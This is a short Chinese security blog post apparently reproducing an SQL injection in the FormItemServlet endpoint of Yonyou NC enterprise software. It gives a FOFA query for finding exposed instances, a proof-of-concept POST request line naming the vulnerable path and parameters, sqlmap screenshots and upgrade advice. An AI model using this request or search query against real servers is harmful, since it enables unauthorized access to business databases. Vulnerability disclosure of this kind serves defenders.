> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483910&idx=1&sn=ddd1317a978088995b6a1ebd87b17f71

#  【已复现】用友NC FormItemServlet方法存在SQL注入漏洞  
原创 zz  星络安全实验室   2025-07-13 17:27  
  
<table><tbody><tr><td data-colwidth="576"><section><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
  
漏洞详情：  
  
用友NC系统FormItemServlet方法存在SQL注入漏洞，攻击者可获取数据库敏感信息  
  
漏洞复现：  
  
fofa：  

```
app=&#34;用友-UFIDA-NC&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsUOjQibXFL0M6ibqMQcRDIHUqkXeGmTmvwxpXdnzSc4lI9wVqRlC2Vaibg/640?wx_fmt=png&from=appmsg "")  
  
  
poc：  

```
POST /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1 HTTP/1.1
```

  
使用sqlmap验证注入：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsao3WRuuYBqRTA1ibDicUELPGTCqntwHfoloEddTEXsc8SXYmoj1WKPSA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsb0JpcWPYFhkOVLNr1Humw4Z9yLGGdbzuNCtRuwnovpy5niaicalglVUw/640?wx_fmt=png&from=appmsg "")  
  
复现成功  
  
修复意见：  
  
关注厂商动态，升级至安全版本  
  
  
  
